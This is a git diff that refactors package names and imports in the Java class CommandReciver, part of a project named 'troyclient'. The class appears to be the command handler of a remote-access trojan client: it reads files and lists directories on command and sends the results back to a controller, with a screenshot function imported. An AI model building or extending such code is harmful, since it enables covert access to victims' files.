@@ -1,12 +1,10 @@
-package ch.lebois.troyclient.functions;
+package ch.lebois.troyclient.main;
 
 import ch.lebois.troyclient.chat.Chat;
-import ch.lebois.troyclient.service.Console;
-import ch.lebois.troyclient.service.GetContext;
-import ch.lebois.troyclient.service.ListFiles;
-import ch.lebois.troyclient.service.Sender;
-import ch.lebois.troyclient.service.WebHandler;
-import ch.menthe.io.FileHandler;
+import ch.lebois.troyclient.functions.ListFilesFunction;
+import ch.lebois.troyclient.functions.Screenshot;
+import ch.lebois.troyclient.main.GetContext;
+import ch.lebois.troyclient.service.*;
 
 public class CommandReciver {
 
@@ -69,7 +67,7 @@ public class CommandReciver {
     }
 
     private void readFile(String command) {
-        FileHandler fileHandler = new FileHandler(command.substring(5));
+        FileService fileHandler = new FileService(command.substring(5));
         for (String row : fileHandler.readRows()) {
             sender.send("commandout", row);
         }
@@ -77,12 +75,12 @@ public class CommandReciver {
 
     private void listFiles(String command) {
         try {
-            for (String s : ListFiles.ls(command.substring(3))) {
+            for (String s : ListFilesFunction.ls(command.substring(3))) {
                 System.out.println(s);
                 sender.send("commandout", s);
             }
         } catch (StringIndexOutOfBoundsException e) {
-            for (String s : ListFiles.ls("")) {
+            for (String s : ListFilesFunction.ls("")) {
                 System.out.println(s);
                 sender.send("commandout", s);
             }
